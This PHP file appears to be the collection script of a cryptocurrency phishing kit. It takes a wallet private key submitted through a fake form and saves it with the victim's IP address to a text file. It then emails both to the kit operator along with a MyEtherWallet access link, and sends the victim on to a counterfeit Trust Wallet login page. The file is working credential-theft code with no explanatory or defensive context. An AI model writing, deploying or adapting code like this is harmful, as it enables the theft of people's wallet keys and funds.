<?php
$file = "___wuling2023___.txt";
$PrivateKey = $_POST['PrivateKey'];
$ip = $_SERVER['REMOTE_ADDR'];

$handle = fopen($file, 'a');
fwrite($handle, "\n");
fwrite($handle, "PrivateKey   	: ");
fwrite($handle, "$PrivateKey");
fwrite($handle, "\n");
fwrite($handle, "IP Address	: ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "https://www.myetherwallet.com/wallet/access/ ");
fwrite($handle, "\n");
fclose($handle);
$PrivateKey = $_POST['PrivateKey'];
$ip=$_SERVER['REMOTE_ADDR'];

$message   = "

PrivateKey : ".$PrivateKey." 


IP Address : https://geoiptool.com/?IP=".$ip." 

https://www.myetherwallet.com/wallet/access
";
include 'mail.php';
$subject = "============ RAJA.io ============ ".$ip." ";
$headers = "From: RAJA.io <panampungbarubaru@gmail.com>";
mail($rezult_mail, $subject, $message, $headers);
echo "<script LANGUAGE=\"JavaScript\">
<!--
top.location=\"/trustwallet/login.html?home.html#restore-vault\";
// -->
</script>";
?>
